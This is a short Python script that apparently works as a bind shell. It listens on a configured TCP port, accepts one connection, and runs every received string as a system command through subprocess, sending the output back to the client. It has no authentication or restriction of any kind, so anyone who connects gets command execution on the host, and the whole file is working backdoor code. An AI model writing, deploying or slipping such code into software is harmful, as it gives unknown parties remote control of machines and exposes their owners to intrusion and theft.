from config import *
import socket, subprocess

s = socket.socket()
s.bind((ADDR, PORT))
s.listen(VTY)

con,raddr = s.accept()
while 1:
    data = con.recv(1024).decode()
    if data == "exit":
        break
    msg = subprocess.run(data.split(" "), capture_output=True).stdout
    con.send(msg)
s.close()
